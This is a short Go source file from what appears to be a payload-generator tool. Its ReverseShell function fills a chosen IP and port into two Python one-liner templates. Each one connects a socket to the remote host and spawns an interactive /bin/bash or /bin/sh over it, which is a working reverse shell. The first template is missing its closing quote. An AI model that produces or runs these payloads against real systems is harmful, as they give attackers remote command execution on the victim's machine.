package functions

import "fmt"

func ReverseShell(ip string, port string, language string) []string {
	var payload []string

	if language == "python" {
		for _, i := range pythonL() {
			payload = append(payload, fmt.Sprintf(i, ip, port))

		}
	}
	return payload
}

func pythonL() []string {

	return []string{
		`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%v",%v));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")`,
		`export RHOST="%v";export RPORT=%v;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'`,
	}
}
